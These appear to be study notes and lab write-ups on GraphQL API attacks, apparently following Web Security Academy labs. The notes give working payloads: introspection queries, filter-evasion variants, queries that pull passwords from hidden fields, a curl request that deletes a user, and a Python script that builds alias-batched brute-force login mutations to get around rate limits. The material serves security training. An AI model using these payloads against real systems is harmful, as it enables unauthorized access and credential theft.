## GraphQL API vulnerabilities
Before you can test a GraphQL API, you first need to find its endpoint. As GraphQL APIs use the same endpoint for all requests, this is a valuable piece of information. 
### Universal queries

If you send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.
### Common endpoint names

GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

-    /graphql
-    /api
-    /api/graphql
-    /graphql/api
-    /graphql/graphql

 If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path. 
 > GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints. 

### Exploiting unsanitized arguments

For example, the query below requests a product list for an online shop:
```
    query {
        products {
            id
            name
            listed
        }
    }
```
The product list returned contains only listed products.
```
    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }
```
From this information, we can infer the following:

-    Products are assigned a sequential ID.
-    Product ID 3 is missing from the list, possibly because it has been delisted.

By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.
```
    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```

```
    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
```
### Probing for introspection

It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.

```
    {
        "query": "{__schema{queryType{name}}}"
    }
```
### Running a full introspection query

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.

```
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
### Lab: Accessing private GraphQL posts

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

http://nathanrandal.com/graphql-visualizer/

**BlogPost Type**

| **Field**       | **Type**            |
|-----------------|---------------------|
| `id`            | `Int!`              |
| `image`         | `String!`           |
| `title`         | `String!`           |
| `author`        | `String!`           |
| `date`          | `Timestamp!`        |
| `summary`       | `String!`           |
| `paragraphs`    | `[String!]!`        |
| `isPrivate`     | `Boolean!`          |
| `postPassword`  | `String`            |

---

**Queries**

| **Query**               | **Return Type**       |
|-------------------------|-----------------------|
| `getBlogPost(id: Int!)` | `BlogPost`            |
| `getAllBlogPosts`       | `[BlogPost!]!`        |

```
{
    "query":"query getBlogPost($id: Int!) 
    {
        getBlogPost(id: $id) 
        {
            id
            postPassword
        }
    }
    ","
    variables":
    {
        "id":3
    }
}
```
```
{
  "data": {
    "getBlogPost": {
      "id": 3,
      "postPassword": "p3v40vqhruz53wtw9wxsydrfrcvg0m6l"
    }
  }
}
```
### Lab: Accidental exposure of private GraphQL fields

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos.

Learn more about Working with GraphQL in Burp Suite. 

**BlogPost Type**

| **Field**       | **Type**            |
|-----------------|---------------------|
| `id`            | `Int!`              |
| `image`         | `String!`           |
| `title`         | `String!`           |
| `author`        | `String!`           |
| `date`          | `Timestamp!`        |
| `summary`       | `String!`           |
| `paragraphs`    | `[String!]!`        |

---

**User Type**

| **Field**       | **Type**            |
|-----------------|---------------------|
| `id`            | `Int!`              |
| `username`      | `String!`           |
| `password`      | `String!`           |

---

**Queries**

| **Query**               | **Return Type**       |
|-------------------------|-----------------------|
| `getBlogPost(id: Int!)`  | `BlogPost`            |
| `getAllBlogPosts`        | `[BlogPost!]!`        |
| `getUser(id: Int!)`      | `User`                |



```
  query {
    getUser(id: 1) {
      id
      username
      password
    }
  }
```
return:
```
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "rham3gpca3v7j284b7y7"
    }
  }
}
```
### Bypassing GraphQL introspection defenses

If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`.

 The example below shows an introspection probe sent via GET, with URL-encoded parameters.

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```
### Lab: Finding a hidden GraphQL endpoint

The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos.

>``https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%20%20'%7D,'',true,false,true,false)URL_Encode(false)``

IntrospectionQuery:
```
GET /api?query=query%20IntrospectionQuery%20%7B%0A__schema%20%0A%7B%0AqueryType%20%7B%0Aname%0A%7D%0AmutationType%20%7B%0Aname%0A%7D%0AsubscriptionType%20%7B%0Aname%0A%7D%0Atypes%20%7B%0A%20...FullType%0A%7D%0Adirectives%20%7B%0Aname%0Adescription%0Aargs%20%7B%0A...InputValue%0A%7D%0A%0A%7D%0A%7D%0A%7D%0A%0Afragment%20FullType%20on%20__Type%20%0A%7B%0Akind%0Aname%0Adescription%0Afields(includeDeprecated:%20true)%20%7B%0Aname%0Adescription%0Aargs%20%7B%0A...InputValue%0A%7D%0Atype%20%7B%0A...TypeRef%0A%7D%0AisDeprecated%0AdeprecationReason%0A%7D%0AinputFields%20%7B%0A...InputValue%0A%7D%0Ainterfaces%20%7B%0A...TypeRef%0A%7D%0AenumValues(includeDeprecated:%20true)%20%7B%0Aname%0Adescription%0AisDeprecated%0AdeprecationReason%0A%7D%0ApossibleTypes%20%7B%0A...TypeRef%0A%7D%0A%7D%0A%0Afragment%20InputValue%20on%20__InputValue%20%7B%0Aname%0Adescription%0Atype%20%7B%0A...TypeRef%0A%7D%0AdefaultValue%0A%7D%0A%0Afragment%20TypeRef%20on%20__Type%20%0A%7B%0Akind%0Aname%0AofType%20%7B%0Akind%0Aname%0AofType%20%7B%0Akind%0Aname%0AofType%20%7B%0Akind%0Aname%0A%7D%0A%7D%0A%7D%0A%7D
```
The payload
```
query {
    getUser(id: 3) {
        id
        username
    }
}
```
return 
```
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```
To delete the carlos user:
```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```
```
mutation {
    deleteOrganizationUser(input: { id: 3 }) {
        user {
            id
            username
        }
    }
}
```
Command:
```
curl 'https://ID.web-security-academy.net/api?query=mutation%20%7B%0AdeleteOrganizationUser(input:%20%7B%20id:%203%20%7D)%20%7B%0Auser%20%7B%0Aid%0Ausername%0A%7D%0A%7D%0A%7D' \
-H "Cookie: session=..."
```
### Bypassing rate limiting using aliases

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.


```
query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}
```
### Lab: Bypassing GraphQL brute force protections

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

```py
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567",
    "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master",
    "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer",
    "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger",
    "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel",
    "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111",
    "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",
    "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder",
    "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
]

def generate_query(username, passwords):
    query_parts = []
    for index, password in enumerate(passwords):
        query_parts.append(
            f"bruteforce{index}: login(input: {{ username: \"{username}\", password: \"{password}\" }}) {{\n"
            f"        token\n"
            f"        success\n"
            f"    }}"
        )

    query = "mutation login  {\n" + "\n".join(query_parts) + "\n}"
    return query

username = "carlos"
generated_query = generate_query(username, passwords)
print(generated_query)
```
### Lab: Performing CSRF exploits over GraphQL

The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter.

Learn more about Working with GraphQL in Burp Suite. 